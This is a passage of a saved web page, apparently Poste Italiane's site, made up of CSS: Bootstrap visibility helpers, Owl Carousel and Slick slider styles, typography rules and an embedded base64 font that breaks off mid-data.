(min-width:1200px){.visible-lg-inline{display:inline !important}}@media (min-width:1200px){.visible-lg-inline-block{display:inline-block !important}}@media (max-width:767px){.hidden-xs{display:none !important}}@media (min-width:768px) and (max-width:991px){.hidden-sm{display:none !important}}@media (min-width:992px) and (max-width:1199px){.hidden-md{display:none !important}}@media (min-width:1200px){.hidden-lg{display:none !important}}.visible-print{display:none !important}@media print{.visible-print{display:block !important}table.visible-print{display:table !important}tr.visible-print{display:table-row !important}th.visible-print,td.visible-print{display:table-cell !important}}.visible-print-block{display:none !important}@media print{.visible-print-block{display:block !important}}.visible-print-inline{display:none !important}@media print{.visible-print-inline{display:inline !important}}.visible-print-inline-block{display:none !important}@media print{.visible-print-inline-block{display:inline-block !important}}@media print{.hidden-print{display:none !important}}</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/owl.carousel.css" type="text/css">/* 
 *  Owl Carousel - Animate Plugin
 */
.owl-carousel .animated {
  -webkit-animation-duration: 1000ms;
  animation-duration: 1000ms;
  -webkit-animation-fill-mode: both;
  animation-fill-mode: both;
}
.owl-carousel .owl-animated-in {
  z-index: 0;
}
.owl-carousel .owl-animated-out {
  z-index: 1;
}
.owl-carousel .fadeOut {
  -webkit-animation-name: fadeOut;
  animation-name: fadeOut;
}

@-webkit-keyframes fadeOut {
  0% {
    opacity: 1;
  }

  100% {
    opacity: 0;
  }
}
@keyframes fadeOut {
  0% {
    opacity: 1;
  }

  100% {
    opacity: 0;
  }
}

/* 
 * 	Owl Carousel - Auto Height Plugin
 */
.owl-height {
  -webkit-transition: height 500ms ease-in-out;
  -moz-transition: height 500ms ease-in-out;
  -ms-transition: height 500ms ease-in-out;
  -o-transition: height 500ms ease-in-out;
  transition: height 500ms ease-in-out;
}

/* 
 *  Core Owl Carousel CSS File
 */
.owl-carousel {
  display: none;
  width: 100%;
  -webkit-tap-highlight-color: transparent;
  /* position relative and z-index fix webkit rendering fonts issue */
  position: relative;
  z-index: 1;
}
.owl-carousel .owl-stage {
  position: relative;
  -ms-touch-action: pan-Y;
}
.owl-carousel .owl-stage:after {
  content: ".";
  display: block;
  clear: both;
  visibility: hidden;
  line-height: 0;
  height: 0;
}
.owl-carousel .owl-stage-outer {
  position: relative;
  overflow: hidden;
  /* fix for flashing background */
  -webkit-transform: translate3d(0px, 0px, 0px);
}
.owl-carousel .owl-controls .owl-nav .owl-prev,
.owl-carousel .owl-controls .owl-nav .owl-next,
.owl-carousel .owl-controls .owl-dot {
  cursor: pointer;
  cursor: hand;
  -webkit-user-select: none;
  -khtml-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
.owl-carousel.owl-loaded {
  display: block;
}
.owl-carousel.owl-loading {
  opacity: 0;
  display: block;
}
.owl-carousel.owl-hidden {
  opacity: 0;
}
.owl-carousel .owl-refresh .owl-item {
  display: none;
}
.owl-carousel .owl-item {
  position: relative;
  min-height: 1px;
  float: left;
  -webkit-backface-visibility: hidden;
  -webkit-tap-highlight-color: transparent;
  -webkit-touch-callout: none;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
.owl-carousel .owl-item img {
  display: block;
  width: 100%;
  -webkit-transform-style: preserve-3d;
}
.owl-carousel.owl-text-select-on .owl-item {
  -webkit-user-select: auto;
  -moz-user-select: auto;
  -ms-user-select: auto;
  user-select: auto;
}
.owl-carousel .owl-grab {
  cursor: move;
  cursor: -webkit-grab;
  cursor: -o-grab;
  cursor: -ms-grab;
  cursor: grab;
}
.owl-carousel.owl-rtl {
  direction: rtl;
}
.owl-carousel.owl-rtl .owl-item {
  float: right;
}

/* No Js */
.no-js .owl-carousel {
  display: block;
}

/* 
 * 	Owl Carousel - Lazy Load Plugin
 */
.owl-carousel .owl-item .owl-lazy {
  opacity: 0;
  -webkit-transition: opacity 400ms ease;
  -moz-transition: opacity 400ms ease;
  -ms-transition: opacity 400ms ease;
  -o-transition: opacity 400ms ease;
  transition: opacity 400ms ease;
}
.owl-carousel .owl-item img {
  transform-style: preserve-3d;
}

/* 
 * 	Owl Carousel - Video Plugin
 */
.owl-carousel .owl-video-wrapper {
  position: relative;
  height: 100%;
  background: #000;
}
.owl-carousel .owl-video-play-icon {
  position: absolute;
  height: 80px;
  width: 80px;
  left: 50%;
  top: 50%;
  margin-left: -40px;
  margin-top: -40px;
  background: /*savepage-url=owl.video.play.png*/ url() no-repeat;
  cursor: pointer;
  z-index: 1;
  -webkit-backface-visibility: hidden;
  -webkit-transition: scale 100ms ease;
  -moz-transition: scale 100ms ease;
  -ms-transition: scale 100ms ease;
  -o-transition: scale 100ms ease;
  transition: scale 100ms ease;
}
.owl-carousel .owl-video-play-icon:hover {
  -webkit-transition: scale(1.3, 1.3);
  -moz-transition: scale(1.3, 1.3);
  -ms-transition: scale(1.3, 1.3);
  -o-transition: scale(1.3, 1.3);
  transition: scale(1.3, 1.3);
}
.owl-carousel .owl-video-playing .owl-video-tn,
.owl-carousel .owl-video-playing .owl-video-play-icon {
  display: none;
}
.owl-carousel .owl-video-tn {
  opacity: 0;
  height: 100%;
  background-position: center center;
  background-repeat: no-repeat;
  -webkit-background-size: contain;
  -moz-background-size: contain;
  -o-background-size: contain;
  background-size: contain;
  -webkit-transition: opacity 400ms ease;
  -moz-transition: opacity 400ms ease;
  -ms-transition: opacity 400ms ease;
  -o-transition: opacity 400ms ease;
  transition: opacity 400ms ease;
}
.owl-carousel .owl-video-frame {
  position: relative;
  z-index: 1;
}
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/slick.css" type="text/css">/* Slider */
.slick-slider
{
    position: relative;

    display: block;
    box-sizing: border-box;

    -webkit-user-select: none;
       -moz-user-select: none;
        -ms-user-select: none;
            user-select: none;

    -webkit-touch-callout: none;
    -khtml-user-select: none;
    -ms-touch-action: pan-y;
        touch-action: pan-y;
    -webkit-tap-highlight-color: transparent;
}

.slick-list
{
    position: relative;

    display: block;
    overflow: hidden;

    margin: 0;
    padding: 0;
}
.slick-list:focus
{
    outline: none;
}
.slick-list.dragging
{
    cursor: pointer;
    cursor: hand;
}

.slick-slider .slick-track,
.slick-slider .slick-list
{
    -webkit-transform: translate3d(0, 0, 0);
       -moz-transform: translate3d(0, 0, 0);
        -ms-transform: translate3d(0, 0, 0);
         -o-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
}

.slick-track
{
    position: relative;
    top: 0;
    left: 0;

    display: block;
}
.slick-track:before,
.slick-track:after
{
    display: table;

    content: '';
}
.slick-track:after
{
    clear: both;
}
.slick-loading .slick-track
{
    visibility: hidden;
}

.slick-slide
{
    display: none;
    float: left;

    height: 100%;
    min-height: 1px;
}
[dir='rtl'] .slick-slide
{
    float: right;
}
.slick-slide img
{
    display: block;
}
.slick-slide.slick-loading img
{
    display: none;
}
.slick-slide.dragging img
{
    pointer-events: none;
}
.slick-initialized .slick-slide
{
    display: block;
}
.slick-loading .slick-slide
{
    visibility: hidden;
}
.slick-vertical .slick-slide
{
    display: block;

    height: auto;

    border: 1px solid transparent;
}
.slick-arrow.slick-hidden {
    display: none;
}
</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/slick-theme.css" type="text/css">@charset 'UTF-8';

/* Slider */

.slick-loading .slick-list {
    /*background: #fff url('./ajax-loader.gif') center center no-repeat;
*/
}


/* Arrows */

.slick-prev,
.slick-next {
    font-size: 0;
    line-height: 0;
    position: absolute;
    top: 52%;
    display: block;
    width: 20px;
    height: 20px;
    padding: 0;
    -webkit-transform: translate(0, -50%);
    -ms-transform: translate(0, -50%);
    transform: translate(0, -50%);
    cursor: pointer;
    color: transparent;
    border: none;
    outline: none;
    background: transparent;
    background-repeat: no-repeat;
    background-size: 9px 14px;
}

.slick-prev {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-left.png*/ url();
    background-position: left;
}

.slick-next {
    background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right.png*/ url();
    background-position: right;
}


/*
.slick-prev:hover,
.slick-prev:focus,
.slick-next:hover,
.slick-next:focus
{
    color: transparent;
    outline: none;
    background: transparent;
}*/

.slick-prev:hover:before,
.slick-prev:focus:before,
.slick-next:hover:before,
.slick-next:focus:before {
    opacity: 1;
}

.slick-prev.slick-disabled:before,
.slick-next.slick-disabled:before {
    opacity: .25;
}

.slick-prev:before,
.slick-next:before {
    font-family: 'slick';
    font-size: 20px;
    line-height: 1;
}

.slick-prev {
    left: -25px;
}

[dir='rtl'] .slick-prev {
    right: -25px;
    left: auto;
}


/*.slick-prev:before
{
    content: '←';
}
[dir='rtl'] .slick-prev:before
{
    content: '→';
}*/

.slick-next {
    right: -25px;
}

[dir='rtl'] .slick-next {
    right: auto;
    left: -25px;
}


/*
.slick-next:before
{
    content: '→';
}
[dir='rtl'] .slick-next:before
{
    content: '←';
}*/


/* Dots */

.slick-dotted.slick-slider {
    margin-bottom: 30px;
}

.slick-dots {
    position: absolute;
    bottom: -25px;
    display: block;
    width: 100%;
    padding: 0;
    margin: 0;
    list-style: none;
    text-align: center;
}

.slick-dots li {
    position: relative;
    display: inline-block;
    width: 20px;
    height: 20px;
    margin: 0 5px;
    padding: 0;
    cursor: pointer;
}

.slick-dots li button {
    font-size: 0;
    line-height: 0;
    display: block;
    width: 20px;
    height: 20px;
    padding: 5px;
    cursor: pointer;
    color: transparent;
    border: 0;
    outline: none;
    background: transparent;
}

.slick-dots li button:hover,
.slick-dots li button:focus {
    outline: none;
}

.slick-dots li button:hover:before,
.slick-dots li button:focus:before {
    opacity: 1;
}

.slick-dots li button:before {
    font-family: 'slick';
    font-size: 36px;
    line-height: 20px;
    position: absolute;
    top: 10px;
    left: 0;
    width: 20px;
    height: 20px;
    content: '•';
    text-align: center;
    opacity: .25;
    color: black;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

.slick-dots li.slick-active button:before {
    opacity: .75;
    color: black;
}


/* High res Display  */

@media only screen and (-webkit-min-device-pixel-ratio: 2),
only screen and (min-resolution: 192dpi) {
    .slick-next {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-right@2x.png*/ url();
    }
    .slick-prev {
        background-image: /*savepage-url=/risorse_dt/condivise/immagini/generiche/ico-arrow-grey-left@2x.png*/ url();
    }
}</style>
			
			
			
		
			
			
				<style data-savepage-href="/risorse_dt/condivise/stili/trasversali/base.css" type="text/css">/*****************************************************

    Foglio stile base - (c) Poste Italiane 2016/2017/2018 - GD//FS//DU

*****************************************************/

/*savepage-import-url=/risorse_dt/condivise/stili/trasversali/typography.css*//*****************************************************

    Foglio stile Tipografia - (c) Poste Italiane 2016/2017/2018 - GD//FS//DU

*****************************************************/


/*

8px = 0.4444rem
9px = 0.5rem
10px = 0.5556rem
11px = 0.6111rem
12px = 0.6667rem
13px = 0.7222rem
14px = 0.7778rem
15px = 0.8333rem
16px = 0.8889rem
18px = 1rem (base)
20px = 1.111rem
22px = 1.222rem
24px = 1.333rem
26px = 1.444rem
28px = 1.556rem
30px = 1.667rem
32px = 1.778rem
34px = 1.889rem
36px = 2rem
38px = 2.111rem
40px = 2.222rem
44px = 2.444rem
48.60px = 2.667rem
70px = 3.889rem

*/

html {
    font-size: 18px;
    /* Definizione base */
}

body {
    font-family: 'Texta', sans-serif;
    color: #222427;
    font-weight: 400;
    letter-spacing: 0.3px;
    font-size: 1rem;
}

a {
    color: #0047bb;
    outline: 0;
    outline: none !important;
}

a:hover,
a:focus {
    text-decoration: none;
    color: #00328e;
    outline: none;
}

h1,
h2,
h3,
h4,
h5,
h6,
.h1,
.h2,
.h3,
.h4,
.h5,
.h6,
h1 small,
.h1 small,
h2 small,
.h2 small,
h3 small,
.h3 small,
h1 .small,
.h1 .small,
h2 .small,
.h2 .small,
h3 .small,
.h3 .small {
    color: #4a4a4a;
    font-weight: 400;
}

h1 {
    font-size: 60px;
    font-weight: 500;
}

.h1 {
    font-size: 60px!important;
    font-weight: 500!important;
}

h2,
.h2 {
    color: #0047bb;
    font-size: 44px;
    font-weight: 300;
    margin-bottom: 35px;
    margin-top: 0;
}

h3,
.h3 {
    font-size: 30px;
}

h4,
.h4 {
    font-size: 26px;
}

h5,
.h5 {
    font-size: 22px;
}

h6,
.h6 {
    font-size: 16px;
    text-transform: uppercase;
    font-weight: bold;
}

h1 small,
.h1 small {
    font-size: 43%;
    font-weight: 400;
    padding: 10px 0 0;
    line-height: 135%;
}

.main-result h1 {
    margin-top: 0;
    font-size: 48px;
    font-weight: 200;
}


/* area applicativa */

h3.area-heading {
    font-size: 26px;
    margin-bottom: 20px;
    margin-top: 35px;
    font-weight: 500;
}

fieldset h3.area-heading {
    margin-bottom: 20px;
    margin-top: 0;
}

.box-editable-area .subtext {
    font-size: 16px;
}


/**/

.uppercase{
   text-transform: uppercase!important;
}

.lowercase{
   text-transform: lowercase!important;
}

.capitalize{
   text-transform: capitalize!important;
}

.thin {
    font-weight: 200!important;
}

.light {
    font-weight: 300!important;
}

.regular {
    font-weight: 600!important;
}

.bold {
    font-weight: 600!important;
}

.note {
    font-size: 12px;
    font-style: italic;
}

.text-small{
   font-size: 14px;
}

.cit-heading {
    font-size: 44px;
    line-height: 44px;
    color: #222427;
    margin-bottom: 25px;
}

.cit-body {
    color: #4a4a4a;
}

.text-warning {
    color: #ffb906!important;
}

.text-error {
    color: #ff3636!important;
}

.text-success {
    color: #26b158!important;
}

.text-basic {
    color: #0047bb!important;
}

.text-light {
    color: #787878!important;
}

.text-bright {
    color: #fff!important;
}

.text-dark {
    color: #222427!important;
}

.text-disabled {
    color: #d0d0d0!important;
}


/* Text Truncate  line-clamp */

.line-clamp {
    overflow: hidden;
    position: relative;
    text-align: justify;
    line-height: 1.2rem;
    /*default*/
    max-height: 1.2rem;
    /*default*/
    padding-right: 15px;
}

.line-clamp:before {
    content: '...';
    position: absolute;
    right: 0;
    bottom: 0;
    background: #fff;
    /*
    background : linear-gradient(to right, rgba(255, 255, 255, 0), rgba(255, 255, 255, 1) 45%);
    padding-left: 15px;
    */
}

.line-clamp:after {
    content: '';
    position: absolute;
    right: 0;
    width: 1em;
    height: 1em;
    margin-top: 0.2em;
    background: #fff;
}

.panel-cards .line-clamp {
    line-height: 22px;
    max-height: 22px;
}

.line-clamp-1 {
    max-height: calc(1rem*1.2*1);
}

.line-clamp-2 {
    max-height: calc(1rem*1.2*2);
}

.line-clamp-3 {
    max-height: calc(1rem*1.2*3);
}

.line-clamp-4 {
    max-height: calc(1rem*1.2*4);
}

.line-clamp-5 {
    max-height: calc(1rem*1.2*5);
}

.panel-cards .line-clamp-1 {
    max-height: calc(22px*1);
}

.panel-cards .line-clamp-2 {
    max-height: calc(22px*2);
}

.panel-cards .line-clamp-3 {
    max-height: calc(22px*3);
}

.panel-cards .line-clamp-4 {
    max-height: calc(22px*4);
}

.panel-cards .line-clamp-5 {
    max-height: calc(22px*5);
}


/*xs*/

@media (max-width: 767px) {
    h1,
    .h1 {
        font-size: 48px;
        font-weight: 500;
    }
    h2,
    .h2 {
        font-size: 34px;
    }
    h3,
    .h3 {
        font-size: 26px;
    }
    h4,
    .h4 {
        font-size: 20px;
    }
    .main-result h1 {
        margin-top: 0;
        font-size: 40px;
        font-weight: 200;
    }
}


/*sm*/

@media screen and (min-width: 768px) and (max-width: 991px) {
    h1,
    .h1 {
        font-size: 48px;
    }
    h2,
    .h2 {
        font-size: 34px;
    }
    h3,
    .h3 {
        font-size: 30px;
    }
    .main-result h1 {
        margin-top: 0;
        font-size: 40px;
        font-weight: 200;
    }
}


/*md*/

@media screen and (min-width: 992px) and (max-width: 1199px) {}


/*lg*/

@media (min-width: 1200px) {}

/*savepage-import-url=/risorse_dt/condivise/stili/trasversali/fonts.css*//*****************************************************

    Foglio stile Fonts - (c) PosteItaliane 2016/2017/2018 - GD//FS//DU

*****************************************************/

/* BEGIN Thin */
/*
@font-face {
    font-family: 'Texta';
    src: url("/risorseweb/poste_it/risorseweb/poste_it/risorse_dt/condivise/fonts/texta/Texta-Thin.otf");
    font-style: normal;
    font-weight: 100;
}*/
@font-face {
    font-family: 'Texta';
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.eot*/ url(); /* IE9 Compat Modes */
    src: /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.eot?#iefix*/ url() format('embedded-opentype'), /* IE6-IE8 */
         /*savepage-url=/risorse_dt/condivise/fonts/texta/Texta-Light/Texta-Light.woff*/ url(data:application/font-woff;base64,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